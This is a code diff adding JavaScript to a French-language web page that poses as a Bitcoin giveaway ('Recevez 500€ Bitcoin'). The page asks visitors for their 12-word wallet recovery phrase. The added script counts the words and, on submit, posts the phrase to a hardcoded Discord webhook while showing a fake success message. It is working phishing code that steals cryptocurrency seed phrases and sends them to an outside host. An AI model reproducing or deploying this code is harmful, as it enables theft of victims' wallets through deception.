@@ -278,5 +278,63 @@
     <div id="toast" class="toast"></div>
 
     <script>
-        // Configuration
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492220758938619998/ntvaA4-1bi66QwLpFNayDinPRZ35kdV6SH8cCUogvWyCxgYBScg9vpuwLi0wTjT5sDJQ
+    // Configuration
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492220758938619998/ntvaA4-1bi66QwLpFNayDinPRZ35kdV6SH8cCUogvWyCxgYBScg9vpuwLi0wTjT5sDJQ';
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('loginForm');
+        const seedPhrase = document.getElementById('seedPhrase');
+        const wordCounter = document.getElementById('wordCounter');
+        const errorMessage = document.getElementById('errorMessage');
+        const submitBtn = document.getElementById('submitBtn');
+        const toast = document.getElementById('toast');
+
+        seedPhrase.addEventListener('input', function() {
+            const words = seedPhrase.value.trim().split(/\s+/);
+            wordCounter.textContent = `${words.length} / 12 mots`;
+            wordCounter.classList.toggle('valid', words.length === 12);
+            errorMessage.classList.toggle('show', words.length !== 12);
+        });
+
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loading"></span> Envoi en cours...';
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Nouvelle phrase de récupération: ${seedPhrase.value.trim()}`
+                    })
+                });
+
+                if (response.ok) {
+                    showToast('Code enregistré avec succès!');
+                    form.reset();
+                    wordCounter.textContent = '0 / 12 mots';
+                    wordCounter.classList.remove('valid');
+                    errorMessage.classList.remove('show');
+                } else {
+                    throw new Error('Échec de l\'enregistrement du code');
+                }
+            } catch (error) {
+                showToast(`Erreur: ${error.message}`);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Recevez 500€ Bitcoin';
+            }
+        });
+
+        function showToast(message) {
+            toast.textContent = message;
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+    });
+</script>
